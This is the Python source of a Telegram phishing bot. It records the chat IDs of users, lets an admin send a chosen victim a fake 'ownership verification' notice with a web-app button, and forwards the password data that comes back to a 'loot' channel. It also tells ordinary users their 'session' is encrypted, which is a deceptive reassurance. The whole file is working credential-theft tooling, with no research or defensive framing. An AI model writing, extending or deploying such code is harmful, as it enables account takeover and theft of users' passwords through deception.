import os
import http.server
import socketserver
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8699819680
LOOT_CHANNEL_ID = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"

# Store in a global dictionary (Active Memory)
user_db = {}

# --- RENDER PORT FIX ---
def start_fake_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 10000), handler) as httpd:
        httpd.serve_forever()

threading.Thread(target=start_fake_server, daemon=True).start()

# --- BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user: return
    
    # Store with and without @, and in lowercase to be safe
    raw_username = user.username.lower() if user.username else str(user.id)
    user_db[raw_username] = update.effective_chat.id
    user_db[f"@{raw_username}"] = update.effective_chat.id
    
    if user.id == ADMIN_ID:
        await update.message.reply_text("💠 **Admin Active**\n\nCommands:\n1. `/trigger username` \n2. `/checkdb` (See stored users)")
    else:
        await update.message.reply_text("🛡️ **System Status**: Session Encrypted.")

async def check_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    if not user_db:
        await update.message.reply_text("📭 The database is currently empty. (Bot probably restarted)")
    else:
        user_list = "\n".join([f"• {u}" for u in user_db.keys()])
        await update.message.reply_text(f"📊 **Stored Users:**\n{user_list}")

async def trigger_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return

    if not context.args:
        await update.message.reply_text("Usage: `/trigger username`")
        return

    target = context.args.lower()
    
    if target in user_db:
        chat_id = user_db[target]
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Verify Authenticity", web_app=WebAppInfo(url=TMA_URL))]])
        
        audit_text = (
            "⚠️ **Administrative Notice: Ownership Verification**\n\n"
            "To maintain channel integrity, a routine authenticity check is required.\n\n"
            "**Note:** Active sessions and T-Data will remain unaffected."
        )
        
        try:
            await context.bot.send_message(chat_id=chat_id, text=audit_text, reply_markup=keyboard, parse_mode="Markdown")
            await update.message.reply_text(f"🚀 Audit sent to {target}")
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending: {str(e)}")
    else:
        await update.message.reply_text(f"❌ '{target}' not found. Type `/checkdb` to see who I know.")

async def capture_loot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_message.web_app_data: return
    pswd_data = update.effective_message.web_app_data.data
    user = update.effective_user
    username = user.username or str(user.id)
    suffix = username[-5:]
    await context.bot.send_message(chat_id=LOOT_CHANNEL_ID, text=f"`vtm/pswd/{suffix}/{pswd_data}`", parse_mode="Markdown")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("checkdb", check_database))
    app.add_handler(CommandHandler("trigger", trigger_audit))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, capture_loot))
    app.run_polling()

if __name__ == '__main__':
    main()
